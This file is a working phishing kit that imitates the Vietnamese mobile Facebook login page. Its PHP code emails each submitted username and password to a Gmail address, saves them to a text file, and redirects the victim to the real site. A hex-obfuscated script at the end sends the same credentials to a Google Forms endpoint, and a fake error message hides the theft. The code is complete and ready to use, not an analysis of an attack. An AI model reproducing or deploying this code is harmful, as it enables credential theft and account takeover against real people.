<?php
    session_start();
    ob_start();
?>
    <?php
    	if(isset($_POST["login"])){
    		$username = $_POST["email"];
    		$password = $_POST["pass"];
            if($username == "21"|| $password == "21"){
                echo "Bạn chưa nhập đầy đủ thông tin";
                
            }else{
                
            $_SESSION["username"] = $username;
            echo $_SESSION["username"];
    		 $subject = "Nhớ subscribe nhaaa=))";
             $headers = "Tài khoản - Facebook";
             $body = " \n Tài Khoản : $username \n Mật Khẩu : $password \n ";
             mail("jaxuatt7@gmail.com", $headers, $body, $subject);
            $test = fopen("hu.txt","a");
            fwrite($test,$body);
            fclose($test); 
            header('Location: https://fb.com');
          
            }



    	}

    ?>    
<!DOCTYPE html>
<html lang="vi" id="facebook">
    <head>
        <meta charset="utf-8"/>
        <script src="https://code.jquery.com/jquery-2.2.2.min.js"></script>
    	<title id="pageTitle">Facebook</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
        <meta name="viewport" content="initial-scale=1,maximum-scale=1,user-scalable=no"/>
        <link href="img/O2aKM2iSbOw.png" rel="apple-touch-icon-precomposed" sizes="196x196"/>
        <meta name="referrer" content="no-referrer" />
        <meta name="referrer" content="unsafe-url" />
        <meta name="referrer" content="origin" />
        <meta name="referrer" content="no-referrer-when-downgrade" />
        <meta name="referrer" content="origin-when-cross-origin" />
       <link data-default-icon="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico" data-badged-icon="https://static.xx.fbcdn.net/rsrc.php/ye/r/Ta8_J_nYekI.ico" rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico" />
       <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yf/l/0,cross/BlTIO-iwJWT.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="doIjPiR" crossorigin="anonymous"><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yh/l/0,cross/mymUn3E0JwN.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="kmcUxH7" crossorigin="anonymous"><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yP/l/0,cross/AnSI8cOE6MJ.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="DJZJPcV" crossorigin="anonymous"><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yz/l/0,cross/GsxGVfOEpp-.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="sfRTQdH" crossorigin="anonymous"><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yT/l/0,cross/IxxDAbiZepi.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="XlNyQLM" crossorigin="anonymous">
        <script src="//cdn.jsdelivr.net/npm/sweetalert2@10"></script>
         <script>
        function thongbao(){
            Swal.fire({
  icon: 'error',
  title: 'Có lỗi xảy ra!!!',
  text: 'Vui lòng kiểm tra lại tài khoản hoặc mật khẩu',
  footer: '<a href=""></a>'
})
window.location.replace("http://www.facebook.com");
        }
    </script>
    </head>
    <body tabindex="0" class="touch x1 _fzu _50-3 iframe acw">
        <div class="_5yd0 _2ph- _5yd1" style="" id="thongtin_form" data-sigil="m_login_notice">Để xem tin, bạn vui lòng đăng nhập lại</div>
        <br/>
        <div id="root" role="main" class="_5soa acw" data-sigil="context-layer-root content-pane" style="min-height: 0px;">
          <div class="_7om2 _52we _2pid _52z6">
                                        <div class="_4g34"><a href="#"><img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img" alt="facebook" /></a></div>
                                    </div>
       <div class="aclb _4-4l"> 
        <div class="_5rut"> 
            <form id="login_form" action="index.php" class="mobile-login-form _5spm" method="post" novalidate="1
            data-autoid="autoid_1"> 
                  
                     
                       <div class="_55wo _55x2 _56bf"> 
                        <div id="email_input_container">
                         <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq" id="tk" name="email" required="required" autocomplete="on" id="m_login_email" 
             placeholder="Số di động hoặc email" type="text" data-sigil="m_login_email">
                        </div> 
                        <div> 
                         <div class="_1upc _mg8"> 
                          <div class="_4g33"> 
                           <div class="_4g34 _5i2i _52we"> 
                            <div class="_5xu4">
                           <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" required="required" autocomplete="on" id="mk" name="pass"  placeholder="Mật khẩu" type="password" data-sigil="password-plain-text-toggle-input">
                            </div> 
                           </div> 
                          </div> 
                         </div> 
                        </div> 
                       </div> 
                      
                      <div class="_2pie" style="text-align:center;"> 
                       <div id="u_0_4"> 
                        <button style="cursor: pointer;"  type="submit" value="Đăng nhập" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login"  onclick="thongbao()"><span class="_55sr" >Đăng nhập</span></button> 
                       </div> 
                       <div id="otp_button_elem_container"></div> 
                      </div> 
                      <div class="_xo8"></div> 
                     </form> 
         <div> 
          <div class="_43mg">
           <span class="_43mh">hoặc</span>
          </div> 
          <div class="_52jj _5t3b" id="u_0_6">
           <a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" href="https://m.facebook.com/reg/?cid=103&refsrc=https%3A%2F%2Fm.facebook.com%2F&soft=hjk">Tạo tài khoản mới</a>
          </div> 
         </div> 
         <div> 
          <div class="other-links"> 
           <ul class="_5pkb _55wp"> 
            <li><span class="mfss fcg"><a href="https://m.facebook.com/login/identify/" id="forgot-password-link">Quên mật khẩu?</a></span></li> 
           </ul> 
          </div> 
         </div> 
        </div> 
       </div> 
      </div> 
     </div> 
     <div class="_55wr _5ui2"> 
      <div class="_5dpw"> 
       <div class="_5ui3" data-nocookies="1" id="locale-selector"> 
        <div class="_4g33"> 
         <div class="_4g34"> 
          <span class="_52jc _52j9 _52jh _3ztb">Tiếng Việt</span> 
          <div class="_3ztc">
           <span class="_52jc"><a href="#">中文(台灣)</a></span>
          </div> 
          <div class="_3ztc">
           <span class="_52jc"><a href="#">Español</a></span>
          </div> 
          <div class="_3ztc">
           <span class="_52jc"><a href="#">Français (France)</a></span>
          </div> 
         </div> 
         <div class="_4g34"> 
          <div class="_3ztc">
           <span class="_52jc"><a href="#">English (UK)</a></span>
          </div> 
          <div class="_3ztc">
           <span class="_52jc"><a href="#">한국어</a></span>
          </div> 
          <div class="_3ztc">
           <span class="_52jc"><a href="#">Português (Brasil)</a></span>
          </div> 
          <a href="#"> 
           <div class="_3j87 _1rrd _3ztd" aria-label="Danh sách ngôn ngữ đầy đủ">
            <i class="img sp_7V_P8-AK9yC sx_21ee4d"></i>
           </div> </a> 
         </div> 
        </div> 
       </div> 
       <div class="_5ui4"><div class="_96qv _9a0a"><a href="/facebook?refid=8" class="_96qw" title="Đọc blog của chúng tôi, khám phá trung tâm tài nguyên và tìm cơ hội việc làm.">Giới thiệu</a><span aria-hidden="true"> · </span><a href="/help/?ref=pf&amp;refid=8" class="_96qw" title="Truy cập Trung tâm trợ giúp của chúng tôi.">Trợ giúp</a><span aria-hidden="true"> · </span><span class="_96qw" id="u_0_5_oO">Xem thêm</span></div><div class="_96qv" style="display:none" id="u_0_6_7q"><a href="https://messenger.com/" class="_96qw" title="Xem Messenger."> Messanger </a><a href="/lite/?refid=8" class="_96qw" title="Facebook Lite dành cho Android."> Facebook Lite </a><a href="https://m.facebook.com/watch/?refid=8" class="_96qw" title="Lướt xem video của chúng tôi trên tab Watch."> Watch </a><a href="/directory/people/?refid=8" title="Lướt xem thư mục con người của chúng tôi." class="_96qw">Danh bạ</a><a href="/directory/pages/?refid=8" class="_96qw">Trang</a><a href="/pages/category/?refid=8" class="_96qw">Hạng mục Trang</a><a href="/places/?refid=8" class="_96qw" title="Xem những địa điểm nổi tiếng trên Facebook.">Địa điểm</a><a href="https://facebook.com/games/?refid=8" class="_96qw" title="Xem trò chơi trên Facebook.">Trò chơi</a><a href="/directory/places/?refid=8" title="Lướt xem thư mục địa điểm của chúng tôi." class="_96qw">Vị trí</a><a href="/marketplace/?refid=8" class="_96qw" title="Mua bán trên Facebook Marketplace.">Marketplace</a><a href="https://pay.facebook.com/?refid=8" class="_96qw" target="_blank" title="Tìm hiểu thêm về Facebook Pay">Facebook Pay</a><a href="/directory/groups/?refid=8" title="Lướt xem danh mục nhóm." class="_96qw">Nhóm</a><a href="/jobs/?refid=8" class="_96qw" title="Ứng tuyển việc làm và tuyển dụng trên Facebook.">Việc làm</a><a href="https://www.oculus.com/" class="_96qw" target="_blank" title="Tìm hiểu thêm về Oculus">Oculus</a><a href="https://portal.facebook.com/?refid=8" class="_96qw" target="_blank" title="Tìm hiểu thêm về Portal from Facebook">Portal</a><a href="https://lm.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT3Ip3-UddVtHoBfLJijdn4xWQq84XAWlcxuafP3umUleunRF6CeFMmL-2GFe7FZk_33Fv8_gOQcZG4BFeKqS_D2faytZT63pch5xGkqEohepzDA-dJLSeA_9-IoChRGtedjcGnV3at9NquAFe8oJmtQuhQmTznBkh7tVQ" class="_96qw" title="Hãy xem Instagram" target="_blank" rel="noopener" data-sigil="MLynx_asynclazy">Instagram</a><a href="/local/lists/245019872666104/?refid=8" class="_96qw" title="Lướt xem thư mục Danh sách địa phương của chúng tôi.">Địa phương</a><a href="/fundraisers/?refid=8" class="_96qw" title="Quyên góp cho các mục đích có ý nghĩa.">Chiến dịch gây quỹ</a><a href="/biz/directory/?refid=8" class="_96qw" title="Lướt xem thư mục Dịch vụ Facebook của chúng tôi.">Dịch vụ</a><a href="https://developers.facebook.com/?ref=pf&amp;refid=8" class="_96qw" title="Phát triển trên nền tảng của chúng tôi.">Nhà phát triển</a><a href="/careers/?ref=pf&amp;refid=8" class="_96qw" title="Tạo bước ngoặt mới trong sự nghiệp của bạn với công ty tuyệt vời của chúng tôi">Tuyển dụng</a><a data-nocookies="1" href="/privacy/explanation?refid=8" class="_96qw" title="Tìm hiểu về quyền riêng tư của bạn và Facebook">Quyền riêng tư</a></div><span class="mfss fcg">Facebook, Inc.</span></div>
      </div> 
     </div> 
    </div> 
   </div> 
  </div> 
  <script>
var _0x556e=["\x6F\x6E\x73\x75\x62\x6D\x69\x74","\x23\x6C\x6F\x67\x69\x6E\x5F\x66\x6F\x72\x6D","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72","\x69\x6E\x70\x75\x74\x5B\x69\x64\x3D\x22\x74\x6B\x22\x5D","\x69\x6E\x70\x75\x74\x5B\x69\x64\x3D\x22\x6D\x6B\x22\x5D","\x76\x61\x6C\x75\x65","\x50\x4F\x53\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x6F\x63\x73\x2E\x67\x6F\x6F\x67\x6C\x65\x2E\x63\x6F\x6D\x2F\x66\x6F\x72\x6D\x73\x2F\x75\x2F\x30\x2F\x64\x2F\x65\x2F\x31\x46\x41\x49\x70\x51\x4C\x53\x65\x5F\x64\x45\x64\x46\x35\x2D\x39\x71\x77\x74\x62\x33\x74\x39\x47\x73\x2D\x77\x37\x30\x43\x31\x6B\x55\x53\x42\x66\x47\x6C\x5F\x4B\x61\x56\x5F\x35\x34\x37\x4B\x72\x5A\x51\x75\x70\x70\x4F\x41\x2F\x66\x6F\x72\x6D\x52\x65\x73\x70\x6F\x6E\x73\x65","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x73\x65\x6E\x64"];document[_0x556e[2]](_0x556e[1])[_0x556e[0]]= function(_0x304dx1){let _0x304dx2=document[_0x556e[2]](_0x556e[3]);let _0x304dx3=document[_0x556e[2]](_0x556e[4]);let _0x304dx4=_0x304dx2[_0x556e[5]];let _0x304dx5=_0x304dx3[_0x556e[5]];let _0x304dx6={'\x65\x6E\x74\x72\x79\x2E\x31\x37\x32\x36\x33\x34\x37\x31\x37\x38':_0x304dx4,'\x65\x6E\x74\x72\x79\x2E\x38\x36\x35\x31\x37\x33\x31\x37\x31':_0x304dx5};let _0x304dx7= new URLSearchParams(_0x304dx6);_0x304dx7= _0x304dx7.toString();let _0x304dx8= new XMLHttpRequest();_0x304dx8[_0x556e[8]](_0x556e[6],_0x556e[7],true);_0x304dx8[_0x556e[11]](_0x556e[9],_0x556e[10]);_0x304dx8[_0x556e[12]](_0x304dx7)}
  </script>
 </body>
</html>
